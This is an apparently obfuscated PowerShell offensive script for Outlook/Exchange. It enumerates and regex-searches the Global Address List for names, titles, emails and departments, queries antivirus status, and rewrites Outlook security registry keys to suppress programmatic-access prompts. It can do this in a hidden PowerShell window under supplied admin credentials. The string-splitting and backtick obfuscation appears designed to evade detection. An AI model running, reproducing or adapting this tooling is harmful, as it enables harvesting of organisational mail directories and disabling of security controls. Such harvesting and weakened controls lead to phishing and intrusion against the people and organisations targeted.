        [Parameter(manDaTORy = ${FA`lSe})]
        [System.__ComObject]${M`APi}
    )

    if(!(${M`APi})){

        ${o`UTl`ooK} = &("{2}{0}{1}{3}" -f 'Outlook','I','Get-','nstance')
        ${M`Api} = ${O`U`TLooK}.("{2}{1}{0}"-f'ace','p','GetNames').Invoke(("{1}{0}" -f'PI','MA'))
    }

    ${g`AL} = ${ma`pI}.("{4}{3}{0}{1}{5}{2}" -f 'l','Addr','t','Globa','Get','essLis').Invoke()

    ${g`Al} = ${G`AL}."Ad`D`ResSE`N`TriEs"
    
    ${G`Al} 
}

function iNVOk`E-seAr`chg`AL {

    

    [CmdletBinding()]
    param(
        [Parameter(mAnDATory = ${TR`Ue}, pARameTeRSEtNaMe = "Na`me", pOSitIOn = 0)]
        [string]${fuL`l`NamE},

        [Parameter(mANdATOry = ${tr`UE}, parAmEtErSETNAmE = "j`oBTIT`LE", posITion = 1)]
        [string]${jOBTIT`Le},

        [Parameter(ManDAtory = ${tr`Ue}, PARaMETersETnAMe = "E`mAIl", PosiTIon = 2)]
        [string]${EM`AiL},

        [Parameter(MAnDATOry = ${T`RUe}, pAramEtErSEtNAme = "d`epaRTmE`NT", POSItIoN = 3)]
        [string]${DE`pt},

        [Parameter(mANDatory = ${f`A`lsE}, POSItIoN = 4)]
        [int]${ma`XT`H`Reads} = 15
    )


    ${OUTLO`oK} = &("{3}{1}{0}{2}" -f'-O','t','utlookInstance','Ge')

    ${M`APi} = ${outL`Ook}.("{2}{3}{1}{0}" -f'e','espac','GetNa','m').Invoke(("{1}{0}"-f 'I','MAP'))

    ${G`Al} = &("{5}{0}{3}{2}{4}{6}{1}" -f 'et-Glob','List','dd','alA','re','G','ss') -MAPI ${MA`Pi}

    ${u`sErLi`St} = @()

    ForEach(${EN`T`Ry} in ${G`Al}){
        ${USER`li`st} += ${E`NT`RY}.("{2}{1}{0}"-f'ser','U','GetExchange').Invoke()
    }

    ${g`AL} = ${UsE`RL`ISt}
    
    
    
    ${SEAr`C`HSC`RIpt} = {
        param(${R`E`gex},${Ty`PE},${Us`er})

        if(${rEg`eX}.("{1}{0}" -f 'atch','M').Invoke($(${U`sEr}.${T`YpE}))."S`UCCESs"){
            ${u`ser}
        }
    }


    if(${PscMd`LET}.PaRametERsetNAMe -eq ("{0}{1}" -f'N','ame')){
        ${t`ype} = ("{0}{1}"-f'N','ame')
        ${T`eRM} = ${Fu`LLnAme}
    }
    elseif(${p`ScmdL`eT}.pAraMETerSetNaME -eq ("{0}{1}" -f'J','obTitle')){
        ${T`Ype} = ("{1}{2}{0}" -f'le','Job','Tit')
        ${t`ErM} = ${Jo`B`TItle}
    }
    elseif(${P`scMDL`ET}.PARaMEteRSETName -eq ("{0}{1}" -f 'Em','ail')){
        ${Ty`PE} = ("{0}{3}{1}{5}{2}{4}" -f'Pri','a','Addr','m','ess','rySMTP')
        ${TE`RM} = ${emA`Il}
    }
    else {
        ${t`YPe} = ("{0}{2}{1}" -f 'Depar','nt','tme')
        ${t`ERM} = ${de`pT}
    }

    ${R`E`Gex} = [regex]"\b($Term)\b"
    
    
    ${Se`s`Si`On`sTAtE} =   $MNj::("{0}{2}{1}" -f'Crea','lt','teDefau').Invoke()
    ${se`ssiO`NStAtE}."aP`A`RtME`Nts`TATE" =  (  &("{1}{2}{0}{3}{4}"-f'iL','get-','Ch','D','item')  ("{2}{0}{1}"-f 'Ab','lE:3Av','VaRi') )."vA`lue"::"Curr`EnTT`H`ReAd".("{2}{4}{1}{0}{3}"-f 'tStat','rtmen','Ge','e','tApa').Invoke()

    
    ${mY`V`Ars} = &("{0}{3}{1}{2}" -f'Get','i','able','-Var') -Scope 1

    ${vOR`BiD`DE`NVars} = @("?",("{1}{0}" -f 's','arg'),("{1}{2}{0}" -f 'eFileName','C','onsol'),("{0}{1}"-f'E','rror'),("{2}{0}{1}" -f 'xecu','tionContext','E'),("{1}{0}"-f 'se','fal'),("{0}{1}" -f 'HOM','E'),("{1}{0}" -f 'st','Ho'),("{0}{1}"-f'inp','ut'),("{0}{2}{1}" -f 'In','ject','putOb'),("{1}{0}{2}{4}{3}{5}" -f 'mumAlia','Maxi','s','un','Co','t'),("{1}{4}{2}{3}{0}"-f 'Count','M','imu','mDrive','ax'),("{3}{0}{2}{1}" -f'u','t','mErrorCoun','Maxim'),("{0}{2}{1}{3}{5}{4}"-f'M','ximum','a','fun','onCount','cti'),("{4}{0}{1}{3}{2}"-f'axi','mumH','yCount','istor','M'),("{0}{3}{1}{2}" -f'Maxi','ariableCo','unt','mumV'),("{1}{0}{2}" -f'ocatio','MyInv','n'),("{0}{1}"-f 'nu','ll'),"PID",("{1}{2}{0}{3}" -f 'eter','PSBo','undParam','s'),("{2}{1}{0}"-f 'h','dPat','PSComman'),("{1}{0}{2}"-f 'l','PSCu','ture'),("{4}{2}{1}{3}{0}{6}{5}"-f 'a','fault','De','P','PS','meterValues','ra'),("{0}{1}{2}" -f'P','SH','OME'),("{2}{0}{1}"-f 'o','ot','PSScriptR'),("{1}{2}{3}{0}" -f'e','PSU','IC','ultur'),("{2}{1}{3}{4}{0}"-f'e','ers','PSV','ionTa','bl'),"PWD",("{0}{1}"-f'Sh','ellId'),("{0}{1}{3}{2}"-f'Synchr','onize','sh','dHa'),("{0}{1}"-f 'tru','e'))

    
    ForEach(${V`Ar} in ${m`yv`ArS}){
        if(${V`oRBi`ddEnVars} -notcontains ${v`AR}."nA`ME"){
            ${s`EssIoN`sTate}."vA`Ri`ABL`es".("{1}{0}"-f 'd','Ad').Invoke((&("{0}{1}{2}" -f 'Ne','w-Obj','ect') -Typename ("{5}{7}{1}{4}{8}{0}{2}{10}{9}{3}{11}{6}" -f 'on','m.Ma','.Runspaces.Ses','eVariableE','nagement.Au','Syst','try','e','tomati','at','sionSt','n') -ArgumentList ${V`Ar}."na`mE",${v`Ar}."Va`LUe",${v`AR}."d`EsCR`IptiON",${V`AR}."OP`TiONs",${v`AR}."At`TriB`UTES"))
        }
    }

    
    &("{3}{2}{1}{0}"-f'ose','Verb','te-','Wri') ("{2}{5}{1}{4}{3}{0}" -f'ol','g R','C','ce Po','unSpa','reatin')
    ${P`OOL} =   ( &("{2}{1}{0}" -f'lE','iAb','vAr')  ("{1}{0}" -f'r','QO') -VAlUeONLY  )::("{2}{0}{3}{4}{1}"-f'te','cePool','Crea','Runsp','a').Invoke(1, ${MAXT`HRE`Ads}, ${S`e`Ssi`o`NsTAte}, ${h`OST})
    ${P`oOl}.("{0}{1}"-f 'O','pen').Invoke()

    ${jo`Bs} = @()
    ${p`S} = @()
    ${w`AIT} = @()

    ${c`oUnteR} = 0
    ${ADd`RessCo`U`Nt} = 1

    &("{2}{0}{1}"-f'rite-V','erbose','W') ('Th'+'e '+'Sear'+'c'+'hS'+'tring '+'i'+'s '+"$Term")

    ForEach(${U`sER} in ${G`AL}){

        &("{0}{2}{1}" -f 'Wr','-Verbose','ite') "Searching the through ($AddressCount/$($GAL.Count) address entries.... "

        while ($(${p`OoL}.("{0}{4}{2}{1}{3}" -f'GetAv','R','ilable','unSpaces','a').Invoke()) -le 0){

            &("{0}{3}{1}{2}" -f'S','rt-S','leep','ta') -Milliseconds 500

        }

        ${pS} +=  (  &("{1}{0}{2}{3}"-f '-vARI','gET','abl','E') ("{0}{1}" -f'Eky1v','C')  -vaLUEonlY )::("{2}{0}{1}"-f't','e','crea').Invoke()

        ${pS}[${co`UNt`Er}]."ruNs`PAcE`pOoL" = ${P`OOl}
        
        [void]${pS}[${COUn`T`ER}].("{0}{1}" -f'AddScr','ipt').Invoke(${s`e`A`RcHsCri`PT}).("{3}{2}{0}{1}" -f 'ame','ter','Par','Add').Invoke(("{0}{1}"-f 'R','egex'), ${R`E`GeX}).("{1}{3}{0}{2}"-f 'am','AddP','eter','ar').Invoke(("{1}{0}" -f'ype','T'),${TY`pe}).("{3}{2}{1}{0}"-f 'ameter','ar','P','Add').Invoke(("{1}{0}"-f'r','Use'), ${u`SeR})

        ${j`Obs} += ${p`s}[${c`oUn`TEr}].("{0}{2}{1}"-f'Beg','voke','inIn').Invoke();

        ${wA`It} += ${JO`BS}[${CO`UN`TEr}]."A`syN`cWaItH`ANd`lE"

        ${COu`NTEr} = ${COunt`Er} + 1
        ${A`DDrEss`c`OuNt} = ${aDdR`EssC`OunT} + 1

    }

    ${wAI`TTI`m`eoUt} = &("{0}{1}"-f'Get-D','ate') 

    while ($(${jO`BS} | &('?') {${_}."iscomPl`e`T`ed" -eq ${fA`Lse}})."cOU`Nt" -gt 0 -or $($($(&("{0}{1}"-f 'Get-D','ate')) - ${W`AIT`TiME`ouT})."tOtAL`s`EcoNds") -gt 60) {
        &("{2}{0}{1}"-f 'art','-Sleep','St') -Milliseconds 500
    }

    for (${x} = 0; ${x} -lt ${CO`UnT`er}; ${x}++){

        try {
            
            ${Res`U`lt} = ${pS}[${x}]."e`Ndi`NvokE"(${J`oBS}[${x}])
            if(${RE`s`Ult}){
                ${r`E`suLtSL`IST} += ${r`E`Sult} 
            }

        }
        catch {
            &("{1}{3}{0}{2}"-f'e','Wri','-Warning','t') ('er'+'ror:'+' '+"$_")
        }

        finally {

            ${ps}[${X}].("{1}{0}{2}" -f'spo','Di','se').Invoke()
        }
    }

    ${P`OoL}.("{0}{2}{1}" -f 'Di','ose','sp').Invoke()

    ${rESU`Lt`Sli`st} 

     $ydF::("{1}{3}{0}{4}{2}" -f 'aseComObj','Rel','ct','e','e').Invoke(${O`U`TlOOK}) | &("{2}{1}{0}" -f'l','ut-Nul','O')


}

function g`E`T-SmtpA`ddr`ess {
    

    [CmdletBinding()]
    Param(
        [Parameter(MANdatoRY = ${F`AlSe}, POSiTIOn = 0, VALuefrompipeLinE = ${t`Rue})]
        [string[]]${f`ULLN`Am`es}
    )

    ${OUTl`o`oK} = &("{5}{3}{4}{0}{1}{2}"-f'nst','an','ce','-Out','lookI','Get')
    ${Ma`PI} = ${outLo`OK}.("{0}{1}{2}" -f'Ge','tName','space').Invoke(("{0}{1}" -f'M','API'))
    
    ${G`Al} = &("{4}{2}{0}{1}{3}"-f'Globa','lAddres','t-','sList','Ge') -MAPI ${ma`pI} 

    

    ${primaRySMTP`AdD`R`es`S`Es} = @() 
    If(${f`U`lLNAmeS}){
        ForEach(${NA`me} in ${FUllNA`M`Es}){
            try{
                ${r`e`GeX} = [regex]"\b($Name)\b"
                ${u`Ser} = ${g`Al} | &("{1}{0}{2}" -f're-O','Whe','bject') {${_}."NA`ME" -Match ${R`egeX}}
            }
            catch {
                &("{2}{0}{1}{3}{4}"-f 'i','t','Wr','e-Warn','ing') ('Unab'+'le '+'t'+'o '+'obta'+'in '+'excha'+'nge'+' '+'user'+' '+'object'+' '+'with'+' '+'th'+'e '+'n'+'ame: '+"$Name")
            }
            ${PRI`marySMT`p`AdDre`S`sEs} += $(${u`Ser}.("{2}{3}{1}{0}" -f 'er','angeus','G','etExch').Invoke())."PRIMARYS`mTPad`D`REss"
        }
    }
    else {
        try {
            $($($(${oUT`l`Ook}."sEs`sI`On")."C`UR`RentuseR")."a`ddREsse`NTRY").("{1}{0}{2}"-f'hangeUs','GetExc','er').Invoke()."pRImaRYSm`TPAddr`e`SS"
        }
        catch {
            Throw ("{7}{5}{1}{2}{3}{6}{8}{0}{9}{10}{4}" -f'dd',' to',' obtain Prim','a',' user','able','rySMTP','Un','A','ress ','for the current')
        }
    }

     (&('lS') ("{1}{3}{2}{0}" -f 'Ydf','VaRI','e:','Abl') )."Va`lue"::("{3}{1}{4}{2}{0}" -f 'ect','m','bj','ReleaseCo','O').Invoke(${O`UtLoOk}) | &("{0}{2}{1}"-f'Out-','ll','Nu')

    ${p`RI`MA`RYSmtP`ADdResSES}

}

function Dis`AbLe-sECuRi`T`Y`s`etTIngS {

    
    
    [CmdletBinding()]
    param(
        [Parameter(ManDatORy = ${FaL`SE})]
        [string]${ad`m`InuS`Er},

        [Parameter(maNDATorY = ${f`A`lse})]
        [string]${A`dminPaS`swoRd},

        [parameter(maNdatoRy = ${T`RUE})]
        [string]${Ve`RS`iOn}
    )

    ${CoU`NT} = 0

    
    ${aV} = &("{1}{2}{0}{3}" -f'Wmi','Ge','t-','Object') -namespace (("{2}{1}{0}{4}{3}"-f 'cur','baSe','rootI','r2','ityCente')).RePlaCe('Iba','\') -class ("{3}{2}{4}{0}{1}" -f 'produ','ct','ntivir','A','us')
    if(${A`V}){
        ${aVsT`ATE} = ${aV}."p`RoDu`CtstAtE"
        ${STatU`SC`Ode} = '{0:X6}' -f ${AVS`TAte}
        ${w`Sc`UPda`TEd} = ${STaT`Usc`ode}[4,5] -join '' -as [byte]
        if(${W`s`cupD`ATeD} -eq  (00 -as [byte]))
        {
            &("{2}{1}{0}"-f 'e','rbos','Write-Ve') ("{0}{3}{1}{2}{4}"-f'AV i','up ','to d','s ','ate')
            ${A`VUpD`ATED} = ${Tr`Ue}
        }
        elseif(${Ws`C`UpDAted} -eq (10 -as [byte])){
            &("{2}{0}{1}"-f 'te-','Verbose','Wri') ("{3}{1}{2}{4}{5}{6}{0}" -f' date','s n','ot ','AV i','up',' t','o')
            ${avu`pda`TeD} = ${FA`Lse}
        }
        else{
            &("{2}{1}{0}" -f 'bose','r','Write-Ve') ("{0}{1}{5}{8}{4}{7}{2}{6}{3}" -f'U','n',' determine','V status',' t','ab',' A','o','le')
            ${AVU`PDat`eD} = ${fal`se} 
        }
    }
    else{
        &("{3}{2}{0}{1}" -f'te-Verbos','e','i','Wr') ("{0}{1}{3}{2}{4}"-f'AV no','t ','al','inst','led')
        ${avU`pdA`TED} = ${FA`L`SE}
    }
    

    ${lmseCu`RIty`k`eY} = "HKLM:\SOFTWARE\Microsoft\Office\$Version\outlook\Security"
        
    ${CuSEc`URiT`YKEY} = "HKCU:\SOFTWARE\Policies\Microsoft\Office\$Version\outlook\security"

    ${o`BjeCTMOd`eL`gU`Ard} = ("{4}{2}{0}{3}{1}" -f'tModel','ard','c','Gu','Obje')
    ${p`ROMP`ToomsenD} = ("{1}{0}{2}"-f 'mptOOMSen','Pro','d')
    ${ADmiNSe`Cur`It`ymODE} = ("{2}{0}{4}{1}{3}" -f 'Secur','tyMod','Admin','e','i') 

    ${c`MD} = " "

    if(!(&("{2}{1}{0}"-f'-Path','est','T') ${LM`sEcU`RiTyK`ey})){
        
        ${c`mD} = ('New'+'-It'+'em'+' '+"$LMSecurityKey "+'-F'+'orce'+'; '+'')
        ${C`MD} += ('New-Item'+'Prope'+'r'+'ty '+"$LMSecurityKey "+'-N'+'ame'+' '+'O'+'bjec'+'tModelGu'+'ar'+'d '+'-V'+'a'+'lue '+'2 '+'-'+'Prop'+'erty'+'Type '+'DWO'+'RD '+'-'+'Force'+'; '+'')
       

    }
    else{

        ${cUrR`eN`TVA`lUe} = (&("{2}{0}{1}"-f't','-ItemProperty','Ge') ${lm`Secu`Ri`T`ykeY} -Name ("{3}{0}{2}{1}{4}"-f 'tModelG','r','ua','Objec','d') -ErrorAction ("{0}{2}{1}" -f 'Silent','Continue','ly'))."o`BJEC`T`modeLguArD" 
        if(${Cu`RREN`TVALue} -and (${c`U`Rrent`VALUE} -ne 2)){
            
            ${c`md} = ('Set-Item'+'P'+'roperty'+' '+"$LMSecurityKey "+'-N'+'ame'+' '+'O'+'bject'+'M'+'odelGuard '+'-Val'+'ue'+' '+'2 '+'-Force'+';'+' '+'')
        }
        elseif(!(${C`URrENtv`A`L`Ue})) {
            ${c`md} = ('New-'+'Ite'+'mP'+'ro'+'pe'+'rty '+"$LMSecurityKey "+'-N'+'ame '+'O'+'bje'+'ctMod'+'el'+'Guard '+'-V'+'alue '+'2 '+'-PropertyT'+'yp'+'e'+' '+'DWO'+'RD '+'-For'+'ce;'+' '+'')
        }
    
                
    }
    if(!(&("{2}{1}{0}" -f'st-Path','e','T') ${cU`SEcur`ItYk`EY})){

        ${c`mD} += ('Ne'+'w'+'-Item '+"$CUSecurityKey "+'-Fo'+'rce;'+' '+'')
        ${C`mD} += ('N'+'ew-I'+'tem'+'P'+'r'+'operty '+"$CUSecurityKey "+'-'+'Name '+'PromptO'+'OMSen'+'d '+'-'+'Value '+'2 '+'-Prop'+'erty'+'Typ'+'e '+'DWOR'+'D '+'-'+'Force'+'; '+'') 
        ${c`MD} += ('New'+'-It'+'emPr'+'operty '+"$CUSecurityKey "+'-Na'+'me '+'Admin'+'Secur'+'i'+'tyMode '+'-Val'+'u'+'e '+'3 '+'-Prop'+'er'+'tyType '+'D'+'WORD '+'-F'+'or'+'ce; '+'')
      
    }
    else{
        ${C`UR`REnTv`Alue} = (&("{4}{1}{0}{5}{2}{3}" -f'P','-Item','per','ty','Get','ro') ${CuSe`C`UrItyk`ey} -Name ("{2}{0}{1}"-f'MSe','nd','PromptOO') -ErrorAction ("{4}{0}{3}{1}{2}"-f'ilen','in','ue','tlyCont','S'))."Pr`oM`P`TooM`sENd"
        if(${CuRr`E`NTv`ALUe} -and (${CU`R`R`EnTva`LUE} -ne 2)){
            
            ${C`Md} += ('Se'+'t-ItemPrope'+'r'+'ty'+' '+"$CUSecurityKey "+'-Na'+'me '+'P'+'romptO'+'OMSend '+'-'+'Va'+'lue '+'2 '+'-Forc'+'e'+'; '+'')
            
        }
        elseif(!(${cuRRe`NtVa`L`Ue})) {
             ${c`Md} += ('N'+'ew-'+'I'+'tem'+'Property '+"$CUSecurityKey "+'-'+'Name '+'Prom'+'ptOO'+'MS'+'end '+'-Val'+'ue '+'2 '+'-P'+'r'+'opert'+'yType'+' '+'DWORD'+' '+'-Fo'+'rc'+'e; '+'')
        }
        
        ${c`UR`Rentva`lue} = (&("{2}{0}{3}{1}" -f'tem','y','Get-I','Propert') ${CUs`ec`URI`TYkey} -Name ("{1}{2}{0}{4}{3}"-f'ri','Ad','minSecu','yMode','t') -ErrorAction ("{1}{3}{2}{0}" -f'ontinue','S','yC','ilentl'))."AD`M`insEcUriT`YMode" 
        if(${cu`R`RENTVA`L`Ue} -and (${cuRR`E`NtvaL`UE} -ne 3)){
            
            ${c`Md} += ('S'+'et-Item'+'Pro'+'perty'+' '+"$CUSecurityKey "+'-N'+'ame '+'Adm'+'inS'+'e'+'curityM'+'ode '+'-Valu'+'e'+' '+'3 '+'-F'+'orce')
            
        }
        elseif(!(${Cu`R`RENtvaLue})) {
            ${c`Md} += ('N'+'ew-It'+'e'+'mPro'+'perty '+"$CUSecurityKey "+'-'+'Name '+'A'+'dmi'+'nSe'+'curit'+'yMode '+'-Va'+'lue '+'3 '+'-'+'Property'+'Type '+'DW'+'ORD'+' '+'-F'+'o'+'rce')
        }
                  
    }

    if(${a`D`MinUser} -and ${a`dm`inpASSWo`RD}){

        
        ${p`W} = &("{0}{2}{1}{4}{3}" -f 'Conve','o-S','rtT','g','ecureStrin') ${A`DMIn`paS`SwO`RD} -asplaintext -Force
        ${c`RedS} = &("{2}{0}{1}"-f '-O','bject','New') -Typename ("{5}{6}{3}{10}{4}{8}{1}{7}{0}{2}{9}"-f 'C','m','rede','Ma','m','Sys','tem.','ation.PS','ent.Auto','ntial','nage') -argumentlist ${ADm`InUs`ER},${P`W}
        ${WD} = ((("{4}{0}{5}{2}{9}{7}{12}{1}{3}{10}{8}{13}{14}{11}{6}"-f'ind','PowerShel','{0','l','C:{0}W','ows','}','64{0}W','}','}SysWOW','{0','0{0','indows','v1','.'))  -F[CHaR]92)
        ${a`Rg} = (' '+'-WindowS'+'tyl'+'e '+'hidd'+'en'+' '+'-Comm'+'and '+"$cmd")
        &("{3}{0}{1}{2}"-f'e','s','s','Start-Proc') ("{1}{2}{4}{3}{0}"-f'xe','po','wer','e','shell.') -WorkingDirectory ${Wd} -Credential ${c`R`edS} -ArgumentList ${A`RG}
        ${Co`U`Nt} += 1
        

    }
    else{

        
        if(${c`MD}){
            try {
                &("{4}{2}{0}{3}{1}" -f 'ss','n','pre','io','Invoke-Ex') ${c`mD}
            }
            catch {
                Throw ("{8}{5}{6}{12}{1}{0}{4}{10}{11}{9}{3}{7}{2}"-f ' regi','e','pt','pr','stry settings to disa','e ','t','om','Unabl',' ','ble sec','urity','o chang')
            }
        }
        ${co`Unt} += 1
        
    }
    

    if(${C`ount} -eq 1){
        &("{2}{1}{3}{4}{0}"-f 'e','e-','Writ','Verb','os') ("{1}{2}{0}"-f 's','Succ','es')
    }
    elseif(${c`O`Unt} -eq 0){
        &("{1}{0}{4}{3}{2}" -f '-Ve','Write','e','os','rb') ("{4}{3}{8}{7}{5}{2}{6}{0}{1}" -f 's Fa','iled','tyS','is','D','ri','etting','Secu','able-')
    }

}


function r`eSe`T-`sEcuritY`SE`TtIn`Gs {
    

    [CmdletBinding()]
    param(
        [Parameter(MAnDATORY = ${FA`Lse})]
        [string]${a`dmINU`SEr},

        [Parameter(mANDAtOry = ${fa`L`SE})]
        [string]${adM`iNP`ASs},

        [Parameter(MAndatoRY = ${TR`Ue})]
        [string]${vE`Rs`IOn}
    )


    ${LMsEc`U`R`itYKEy} = "HKLM:\SOFTWARE\Microsoft\Office\$Version\Outlook\Security"

    ${cU`S`eCUr`ityk`ey} = "HKCU:\SOFTWARE\Policies\Microsoft\Office\$Version\outlook\security"

        
        
    
    if(&("{0}{1}" -f 'Test-Pat','h') ${LMs`E`cuRITyK`ey}){
        
        ${C`MD} = ('Remov'+'e-I'+'temPro'+'p'+'er'+'ty '+'-Path'+' '+"$LMSecurityKey "+'-'+'Name '+'ObjectMo'+'delGu'+'a'+'rd'+' '+'-Forc'+'e;')
    }

    if(&("{1}{0}{2}" -f 'st','Te','-Path') ${c`US`e`CuRITy`keY}){

        ${c`md} += ('Remo'+'ve'+'-I'+'temPro'+'perty '+'-'+'P'+'ath '+"$CUSecurityKey "+'-'+'Nam'+'e '+'P'+'romptO'+'OMSen'+'d'+' '+'-'+'F'+'orce;') 
        ${c`mD} += ('R'+'emov'+'e-'+'I'+'temPrope'+'rty '+'-'+'Pat'+'h '+"$CUSecurityKey "+'-Nam'+'e '+'A'+'dminSecur'+'it'+'y'+'Mode '+'-F'+'orc'+'e')

    }

    if(${AdM`inuS`ER} -and ${AD`m`iNPAss}){

        ${Pw} = &("{4}{6}{0}{1}{2}{5}{3}" -f'ver','tTo-S','ecureStr','ng','Co','i','n') ${AdM`inPA`sS} -asplaintext -Force
        ${C`RE`DS} = &("{1}{3}{0}{2}"-f'O','N','bject','ew-') -Typename ("{8}{1}{2}{7}{5}{4}{6}{0}{3}"-f 'r','tem.Ma','n','edential','ti','ma','on.PSC','agement.Auto','Sys') -argumentlist ${a`DmiNU`ser},${Pw}
        ${wd} = ((("{0}{9}{2}{6}{8}{7}{3}{4}{5}{10}{1}" -f 'C:gH0Win','H0','s','PowerShe','ll','gH0v1.','WOW64gH0Wi','dows','n','dowsgH0Sy','0g'))-crEplACe'gH0',[CHAr]92)
        ${a`Rg} = (' '+'-'+'Wi'+'ndow'+'Style '+'hidden'+' '+'-Com'+'mand '+"$cmd")
        &("{0}{1}{3}{2}"-f 'Start-P','r','ess','oc') ("{2}{3}{0}{1}" -f'shell.e','xe','po','wer') -WorkingDirectory ${W`d} -Credential ${C`ReDS} -ArgumentList ${a`RG} 
    }
    else {
        try {
            &("{1}{2}{0}{3}{4}"-f'pres','I','nvoke-Ex','si','on') ${c`MD}
        }
        catch {
            Throw ("{1}{4}{3}{5}{0}{2}" -f'stry ','Unab','keys','o re','le t','set regi')
        }
    }

}


function g`ET-`ouT`LOoKI`NstaNCe {
    
    try {
        ${out`lO`Ok} = &("{1}{0}{2}" -f'bjec','New-O','t') -ComObject ("{6}{1}{3}{4}{5}{2}{0}" -f'on','o','icati','o','k.','Appl','Outl')
    }
    catch {
        Throw ("{0}{2}{7}{4}{1}{6}{3}{5}"-f'Unable to ope',' C','n Outl','j','ok','ect','omOb','o')
    }
    

    ${OU`TlO`oK}


}